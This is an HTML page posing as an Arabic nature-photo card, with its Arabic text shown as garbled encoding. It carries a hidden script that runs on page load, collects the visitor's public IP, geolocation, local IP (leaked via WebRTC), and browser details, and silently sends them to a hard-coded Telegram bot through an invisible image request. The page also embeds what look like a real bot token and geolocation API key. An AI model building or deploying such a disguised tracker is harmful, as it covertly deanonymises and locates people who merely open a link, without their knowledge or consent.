<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ø¬Ù…Ø§Ù„ Ø§Ù„Ø·Ø¨ÙŠØ¹Ø©</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0c10;font-family:Tahoma}
    .card{position:relative;width:90%;max-width:600px;border-radius:16px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,.6)}
    .card img{width:100%;display:block}
    .caption{position:absolute;bottom:0;width:100%;background:rgba(0,0,0,.45);color:#fff;text-align:center;padding:14px 10px;font-size:1.1rem}
  </style>
</head>
<body>

  <div class="card">
    <img src="https://images.unsplash.com/photo-1501785888041-af3ef285b470" alt="Ø·Ø¨ÙŠØ¹Ø©">
    <div class="caption">Ø§Ø³ØªÙ…ØªØ¹ Ø¨Ø§Ù„Ù…Ù†Ø¸Ø± Ø§Ù„Ø³Ø§Ø­Ø±</div>
  </div>

<script>
  // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª
  const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
  const CHAT_ID   = "6036900535";

  // 1) IP + Ø¯Ù‚Ø© Ø¹Ø§Ù„ÙŠØ© Ù‚Ø¯Ø± Ø§Ù„Ø¥Ù…ÙƒØ§Ù†
  function getIpGeo() {
    return fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301")
      .then(r => r.json());
  }

  // 2) WebRTC Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¹Ù†ÙˆØ§Ù† IP Ø§Ù„Ù…Ø­Ù„ÙŠ (ÙŠØ¹Ø·ÙŠ ÙÙƒØ±Ø© Ø¹Ù† Ø§Ù„Ø´Ø¨ÙƒØ©)
  function getLocalIP() {
    return new Promise(res => {
      const pc = new RTCPeerConnection({iceServers: []});
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); return; }
        const ip = e.candidate.candidate.split(" ")[4];
        if (ip.match(/^(192\.|10\.|172\.)/)) res(ip);
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      setTimeout(() => { pc.close(); res(null); }, 1000);
    });
  }

  // 3) Ù‚ÙŠØ§Ø³ Ø²Ù…Ù† Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© (Round-Trip) Ù„Ø£Ù‚Ø±Ø¨ Ø®Ø§Ø¯Ù…
  function pingTime() {
    const start = performance.now();
    return fetch("https://www.gstatic.com/generate_204")
      .then(() => performance.now() - start)
      .catch(() => null);
  }

  // Ø¯Ù…Ø¬ ÙƒÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§
  Promise.all([getIpGeo(), getLocalIP(), pingTime()])
    .then(async ([ipInfo, localIP, rtt]) => {
      const lat = parseFloat(ipInfo.latitude);
      const lng = parseFloat(ipInfo.longitude);
      // "ØªØ­Ø³ÙŠÙ†" Ø¨Ø³ÙŠØ·: Ù†Ø¶ÙŠÙ Ø¶ÙˆØ¶Ø§Ø¡ ØµØºÙŠØ±Ø© Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ RTT (Ù…Ø¬Ø±Ø¯ Ù…Ø«Ø§Ù„)
      const noise = (rtt || 0) / 30000; // ~30ms â‰ˆ 1km
      const newLat = (lat + noise * 0.01).toFixed(6);
      const newLng = (lng + noise * 0.01).toFixed(6);

      const msg = `ðŸ“ Ù…ÙˆÙ‚Ø¹ Ù…ÙØ­Ø³Ù‘Ù† (Ø£Ù‚ØµÙ‰ Ø¯Ù‚Ø© Ù…ØªØµÙØ­)!\n` +
                  `Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ Ø§Ù„Ø¹Ø§Ù…: ${ipInfo.ip}\n` +
                  `Ø§Ù„Ø¢ÙŠ Ø¨ÙŠ Ø§Ù„Ù…Ø­Ù„ÙŠ: ${localIP || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n` +
                  `ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©: ${rtt ? rtt.toFixed(1) + ' ms' : 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n` +
                  `Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfo.country_name}\n` +
                  `Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©: ${ipInfo.state_prov}\n` +
                  `Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfo.city}\n` +
                  `Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…ÙØ­Ø³Ù‘ÙŽÙ†: https://www.google.com/maps?q=${newLat},${newLng}\n` +
                  `ISP: ${ipInfo.isp}\n` +
                  `Ø§Ù„Ù…ØªØµÙØ­/Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${navigator.platform} | ${navigator.userAgent}\n` +
                  `Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString("ar-EG")}`;

      // Ø¥Ø±Ø³Ø§Ù„ pixel ping Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
      const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
                          `?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
      const img = new Image();
      img.style.display = "none";
      document.body.appendChild(img);
      img.src = telegramURL;
    })
    .catch(() => {});
</script>

</body>
</html>
